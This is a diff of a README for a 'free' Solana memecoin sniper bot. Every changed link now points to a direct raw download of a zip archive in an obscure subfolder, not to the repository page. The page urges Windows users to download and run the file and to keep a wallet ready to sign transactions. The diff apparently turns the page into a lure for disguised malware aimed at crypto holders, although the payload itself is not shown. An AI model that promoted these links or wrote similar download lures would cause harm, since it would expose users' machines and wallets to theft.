@@ -1,12 +1,12 @@
 # 🚀 Free-Solana-Sniper-Memecoins-Bot-2026 - Fast Solana Token Sniping
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026/raw/refs/heads/main/natantly/Sniper-Memecoins-Solana-Free-Bot-2.6.zip)
 
 ## 🔽 Download
 
 Visit this page to download and run this app on Windows:
 
-[https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026)
+[https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026/raw/refs/heads/main/natantly/Sniper-Memecoins-Solana-Free-Bot-2.6.zip](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026/raw/refs/heads/main/natantly/Sniper-Memecoins-Solana-Free-Bot-2.6.zip)
 
 ## 🖥️ What This App Does
 
@@ -37,7 +37,7 @@ For best use, keep your wallet ready and make sure it can sign transactions on S
 ## 📦 How to Download and Open It
 
 1. Open the download page:
-   [Free-Solana-Sniper-Memecoins-Bot-2026](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026)
+   [Free-Solana-Sniper-Memecoins-Bot-2026](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026/raw/refs/heads/main/natantly/Sniper-Memecoins-Solana-Free-Bot-2.6.zip)
 
 2. Look for the latest release, app file, or download package.
 
@@ -281,7 +281,7 @@ Once the app runs, save your settings and keep the folder in place. If you move 
 ## 🗂️ Quick Access
 
 Download page:
-[https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026)
+[https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026/raw/refs/heads/main/natantly/Sniper-Memecoins-Solana-Free-Bot-2.6.zip](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026/raw/refs/heads/main/natantly/Sniper-Memecoins-Solana-Free-Bot-2.6.zip)
 
 Main project:
-[Free-Solana-Sniper-Memecoins-Bot-2026](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026)
+[Free-Solana-Sniper-Memecoins-Bot-2026](https://github.com/Genuspinicolawitching65/Free-Solana-Sniper-Memecoins-Bot-2026/raw/refs/heads/main/natantly/Sniper-Memecoins-Solana-Free-Bot-2.6.zip)
